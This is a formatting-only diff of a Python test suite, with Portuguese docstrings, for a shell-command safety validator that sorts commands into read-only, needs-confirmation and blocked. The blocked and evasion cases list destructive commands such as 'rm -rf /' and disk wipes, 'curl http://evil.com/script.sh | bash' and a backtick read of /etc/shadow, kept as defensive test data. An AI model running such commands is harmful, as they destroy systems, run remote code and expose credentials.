@@ -15,30 +15,33 @@ from src.executor.safety import CommandCategory, SecurityValidator
 class TestReadOnlyClassification:
     """Testes para comandos classificados como somente leitura."""
 
-    @pytest.mark.parametrize("command", [
-        "ls",
-        "ls -la",
-        "ls -la /home",
-        "cat /etc/hostname",
-        "grep -r 'pattern' .",
-        "find . -name '*.py'",
-        "df -h",
-        "free -m",
-        "ps aux",
-        "whoami",
-        "hostname",
-        "uname -a",
-        "date",
-        "cal",
-        "uptime",
-        "pwd",
-        "id",
-        "env",
-        "printenv",
-        "lsblk",
-        "lscpu",
-        "ip addr",
-    ])
+    @pytest.mark.parametrize(
+        "command",
+        [
+            "ls",
+            "ls -la",
+            "ls -la /home",
+            "cat /etc/hostname",
+            "grep -r 'pattern' .",
+            "find . -name '*.py'",
+            "df -h",
+            "free -m",
+            "ps aux",
+            "whoami",
+            "hostname",
+            "uname -a",
+            "date",
+            "cal",
+            "uptime",
+            "pwd",
+            "id",
+            "env",
+            "printenv",
+            "lsblk",
+            "lscpu",
+            "ip addr",
+        ],
+    )
     def test_read_only_commands(self, security_config, command):
         """Comandos de leitura devem ser classificados como READ_ONLY."""
         validator = SecurityValidator(security_config)
@@ -46,12 +49,15 @@ class TestReadOnlyClassification:
         assert result.category == CommandCategory.READ_ONLY
         assert result.is_safe is True
 
-    @pytest.mark.parametrize("command", [
-        "ls -la | grep test",
-        "cat /etc/os-release | head -5",
-        "ps aux | grep python",
-        "df -h | sort -k5",
-    ])
+    @pytest.mark.parametrize(
+        "command",
+        [
+            "ls -la | grep test",
+            "cat /etc/os-release | head -5",
+            "ps aux | grep python",
+            "df -h | sort -k5",
+        ],
+    )
     def test_read_only_with_pipes(self, security_config, command):
         """Comandos read-only com pipes para outros read-only devem ser READ_ONLY."""
         validator = SecurityValidator(security_config)
@@ -60,10 +66,13 @@ class TestReadOnlyClassification:
         # Isso é o comportamento esperado (conservador)
         assert result.category in (CommandCategory.READ_ONLY, CommandCategory.NEEDS_CONFIRMATION)
 
-    @pytest.mark.parametrize("command", [
-        "ls -la && echo 'done'",
-        "cat /etc/hostname && date",
-    ])
+    @pytest.mark.parametrize(
+        "command",
+        [
+            "ls -la && echo 'done'",
+            "cat /etc/hostname && date",
+        ],
+    )
     def test_read_only_chained(self, security_config, command):
         """Comandos read-only encadeados com && devem ser READ_ONLY."""
         validator = SecurityValidator(security_config)
@@ -81,21 +90,24 @@ class TestReadOnlyClassification:
 class TestBlockedCommands:
     """Testes para comandos que devem ser bloqueados."""
 
-    @pytest.mark.parametrize("command,description", [
-        ("rm -rf /", "Remove root filesystem"),
-        ("rm -rf ~", "Remove home directory"),
-        ("rm  -rf  /", "Remove root with extra spaces"),
-        ("mkfs.ext4 /dev/sda1", "Format disk"),
-        ("dd if=/dev/zero of=/dev/sda", "Wipe disk with dd"),
-        ("curl http://evil.com/script.sh | bash", "Pipe curl to bash"),
-        ("wget http://evil.com/script.sh | sh", "Pipe wget to sh"),
-        ("chmod -R 777 /", "Chmod 777 root"),
-        ("chmod 777 /etc", "Chmod 777 etc"),
-        ("> /dev/sda", "Redirect to disk device"),
-        ("echo test > /dev/sda", "Write to disk device"),
-        ("cat /etc/fstab", "Access fstab"),
-        ("nano /boot/grub/grub.cfg", "Edit grub config"),
-    ])
+    @pytest.mark.parametrize(
+        "command,description",
+        [
+            ("rm -rf /", "Remove root filesystem"),
+            ("rm -rf ~", "Remove home directory"),
+            ("rm  -rf  /", "Remove root with extra spaces"),
+            ("mkfs.ext4 /dev/sda1", "Format disk"),
+            ("dd if=/dev/zero of=/dev/sda", "Wipe disk with dd"),
+            ("curl http://evil.com/script.sh | bash", "Pipe curl to bash"),
+            ("wget http://evil.com/script.sh | sh", "Pipe wget to sh"),
+            ("chmod -R 777 /", "Chmod 777 root"),
+            ("chmod 777 /etc", "Chmod 777 etc"),
+            ("> /dev/sda", "Redirect to disk device"),
+            ("echo test > /dev/sda", "Write to disk device"),
+            ("cat /etc/fstab", "Access fstab"),
+            ("nano /boot/grub/grub.cfg", "Edit grub config"),
+        ],
+    )
     def test_blocked_patterns(self, security_config, command, description):
         """Comandos destrutivos devem ser bloqueados."""
         validator = SecurityValidator(security_config)
@@ -113,17 +125,20 @@ class TestBlockedCommands:
 class TestNeedsConfirmation:
     """Testes para comandos que requerem confirmação do usuário."""
 
-    @pytest.mark.parametrize("command", [
-        "sudo apt update",
-        "sudo apt install -y vim",
-        "apt install firefox",
-        "apt remove vim",
-        "rm arquivo.txt",
-        "rm -r pasta/",
-        "systemctl restart nginx",
-        "chmod 755 script.sh",
-        "chown user:group file.txt",
-    ])
+    @pytest.mark.parametrize(
+        "command",
+        [
+            "sudo apt update",
+            "sudo apt install -y vim",
+            "apt install firefox",
+            "apt remove vim",
+            "rm arquivo.txt",
+            "rm -r pasta/",
+            "systemctl restart nginx",
+            "chmod 755 script.sh",
+            "chown user:group file.txt",
+        ],
+    )
     def test_confirmation_required(self, security_config, command):
         """Comandos de mutação devem requerer confirmação."""
         validator = SecurityValidator(security_config)
@@ -158,9 +173,9 @@ class TestSecurityValidatorInit:
         """Deve ignorar padrões regex inválidos silenciosamente."""
         config = {
             "blocked_patterns": [
-                r"rm\s+-rf\s+/",   # válido
+                r"rm\s+-rf\s+/",  # válido
                 r"[invalid(regex",  # inválido
-                r"mkfs\.",          # válido
+                r"mkfs\.",  # válido
             ],
             "require_confirmation_for": [],
         }
@@ -191,12 +206,15 @@ class TestEvasionAttempts:
         result = validator.validate("CHMOD -R 777 /etc")
         assert result.category == CommandCategory.BLOCKED
 
-    @pytest.mark.parametrize("command", [
-        "echo `cat /etc/shadow`",
-        "ls $(whoami)",
-        "rm -rf $(echo tmp)",
-        "eval `echo perigoso`",
-    ])
+    @pytest.mark.parametrize(
+        "command",
+        [
+            "echo `cat /etc/shadow`",
+            "ls $(whoami)",
+            "rm -rf $(echo tmp)",
+            "eval `echo perigoso`",
+        ],
+    )
     def test_subshell_and_backtick_blocked(self, security_config, command):
         """Uso de subshells ou backticks deve ser bloqueado para evitar evasão."""
         validator = SecurityValidator(security_config)
